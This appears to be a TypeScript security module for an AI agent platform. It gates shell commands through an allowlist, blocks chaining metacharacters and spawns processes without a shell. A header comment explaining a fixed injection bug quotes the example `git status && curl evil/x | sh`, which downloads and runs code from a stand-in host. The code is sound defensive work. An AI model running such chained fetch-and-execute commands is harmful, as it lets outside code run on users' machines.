import type { CommandShell } from '../../../shared/actions/ActionTypes';

/**
 * Shared allowlist + safe-execution logic for anything that runs a shell command — RunCommandPlugin
 * and StartProcessPlugin both gate on this, and shellExec.ts/ProcessManager.ts both resolve the
 * actual process invocation through resolveSafeInvocation() below. Extracted from RunCommandPlugin's
 * original inline prefix check so both plugins stay in lockstep instead of drifting into two
 * separate allowlists. Includes AI CLI workers (claude/codex/gemini/ollama) alongside dev-tool
 * prefixes — Paw treats them as just more interchangeable workers it can reach for, not a special
 * category.
 *
 * SECURITY (P0-1, closed 2026-08-13): the previous model checked only the FIRST whitespace-delimited
 * token of a command string against this allowlist, then handed the ENTIRE raw string to a real
 * shell (child_process.exec() always spawns a shell; spawn(...,{shell:true}) does too). That let a
 * command like `git status && curl evil/x | sh` pass the allowlist check (first token "git" is
 * allowed) while the shell itself chained a second, unvalidated command after it. The fix is
 * architectural, not a bigger blacklist: every command PawOS runs now goes through
 * resolveSafeInvocation() below, which (a) rejects the whole command outright if it contains ANY
 * shell metacharacter capable of chaining, piping, redirecting, or substituting a second command —
 * checked on the raw string, so quoting can't hide one — and (b) for the default (no explicit shell)
 * case, tokenizes the command into a real argv array and hands that array to a real process spawn
 * with NO shell intermediary at all (cross-spawn, shell:false) — so even a hypothetical bypass of (a)
 * could not smuggle a second command, because there is no shell present to interpret one.
 * `shell:'powershell'|'gitbash'` requests still need SOME interpreter (that's the point of picking
 * one), so those pass the (already metacharacter-free, per (a)) command text as a single argv element
 * straight to the target interpreter binary — never built into a bigger string an OUTER shell parses
 * first, which was the real double-shell-parsing hole in the old withShell() helper (exec() already
 * spawns cmd.exe as an outer shell; withShell() then built ANOTHER shell invocation as a plain string
 * inside that, so cmd.exe's own operator parsing ran before powershell/bash ever saw the text).
 */
const ALLOWED_PREFIXES = [
  'npm', 'npx', 'node', 'git', 'python', 'python3', 'py', 'pip', 'pip3', 'yarn', 'pnpm',
  'claude', 'codex', 'gemini', 'ollama',
  'java', 'javac',
  // Infrastructure Runtime — the user's own installed, authenticated CLIs.
  // Paw drives real container/cloud/orchestration tools this way instead of
  // reimplementing their APIs, same discipline as RunDeployScriptPlugin
  // never inventing deployment infrastructure.
  'docker', 'docker-compose', 'kubectl', 'helm',
  'aws', 'gcloud', 'az', 'doctl', 'terraform', 'ssh', 'scp',
  'vercel', 'netlify',
];

export function firstToken(command: string): string {
  return command.trim().split(/\s+/)[0]?.toLowerCase() ?? '';
}

export function isAllowedPrefix(command: string): boolean {
  return ALLOWED_PREFIXES.includes(firstToken(command));
}

export function allowedPrefixesList(): string {
  return ALLOWED_PREFIXES.join(', ');
}

/**
 * Characters/sequences that mean "run something else" to a shell — chaining (&&, ||, ;, &),
 * piping (|), redirection (>, >>, <), command substitution (`...`, $(...)), and raw control
 * characters that could be used to smuggle a second line. Checked against the RAW command string
 * (including inside quoted segments) — none of PawOS's allowlisted commands legitimately need any of
 * these, so this is a strict blanket block, not a context-aware parser. Order doesn't affect
 * behavior; it's listed compound-operator-first purely so the reported label in a rejection message
 * is the most specific one that actually matched.
 */
const DANGEROUS_SHELL_SYNTAX: ReadonlyArray<{ pattern: RegExp; label: string }> = [
  { pattern: /&&/, label: '&&' },
  { pattern: /\|\|/, label: '||' },
  { pattern: /\$\(/, label: '$(' },
  { pattern: /`/, label: '`' },
  { pattern: /;/, label: ';' },
  { pattern: /\|/, label: '|' },
  { pattern: /&/, label: '&' },
  { pattern: />/, label: '>' },
  { pattern: /</, label: '<' },
  { pattern: /[\r\n]/, label: 'newline' },
  { pattern: /\0/, label: 'null byte' },
];

/** Returns the offending operator if the command contains anything that could chain/pipe/redirect/substitute a second command, else null. */
export function findDangerousShellSyntax(command: string): string | null {
  for (const { pattern, label } of DANGEROUS_SHELL_SYNTAX) {
    if (pattern.test(command)) return label;
  }
  return null;
}

/**
 * Splits a command string into a real argv array — quote-aware (so `git commit -m "fix: A B"`
 * becomes ['git','commit','-m','fix: A B']) but deliberately NOT a shell parser: no variable
 * expansion, no globbing, no backslash escapes beyond the quote characters themselves. Returns null
 * for unbalanced quotes rather than guessing at intent. This is what makes real argv-array (no-shell)
 * execution possible for the default case — see resolveSafeInvocation().
 */
export function tokenizeCommand(command: string): string[] | null {
  const tokens: string[] = [];
  let current = '';
  let inToken = false;
  let quoteChar: '"' | "'" | null = null;
  for (let i = 0; i < command.length; i++) {
    const ch = command[i]!;
    if (quoteChar) {
      if (ch === quoteChar) quoteChar = null;
      else current += ch;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quoteChar = ch;
      inToken = true;
      continue;
    }
    if (ch === ' ' || ch === '\t') {
      if (inToken) {
        tokens.push(current);
        current = '';
        inToken = false;
      }
      continue;
    }
    current += ch;
    inToken = true;
  }
  if (quoteChar) return null;
  if (inToken) tokens.push(current);
  return tokens;
}

export type ResolvedInvocation = { bin: string; args: string[] };

/**
 * The single choke point every command-execution path (shellExec.ts's execShellCommand,
 * ProcessManager.start()) must go through before spawning anything. Never returns a
 * shell-interpretable string — always a concrete {bin, args} pair for a real, shell-less process
 * spawn (or, for an explicitly requested interpreter, a single opaque script argument handed
 * directly to that interpreter's binary — never re-parsed by an outer shell first).
 */
export function resolveSafeInvocation(
  command: string,
  shell?: CommandShell
): { ok: true; invocation: ResolvedInvocation } | { ok: false; message: string } {
  const trimmed = command.trim();
  if (!trimmed) return { ok: false, message: 'Command rejected: empty command.' };

  const dangerous = findDangerousShellSyntax(trimmed);
  if (dangerous) {
    return {
      ok: false,
      message: `Command rejected: contains "${dangerous}", which could chain, pipe, redirect, or substitute a second command. Run one plain command at a time.`,
    };
  }

  if (shell === 'powershell') {
    return { ok: true, invocation: { bin: 'powershell.exe', args: ['-NoProfile', '-NonInteractive', '-Command', trimmed] } };
  }
  if (shell === 'gitbash') {
    return { ok: true, invocation: { bin: 'bash', args: ['-lc', trimmed] } };
  }

  const tokens = tokenizeCommand(trimmed);
  if (!tokens || tokens.length === 0) {
    return { ok: false, message: 'Command rejected: could not be safely parsed (check for an unbalanced quote).' };
  }
  return { ok: true, invocation: { bin: tokens[0]!, args: tokens.slice(1) } };
}
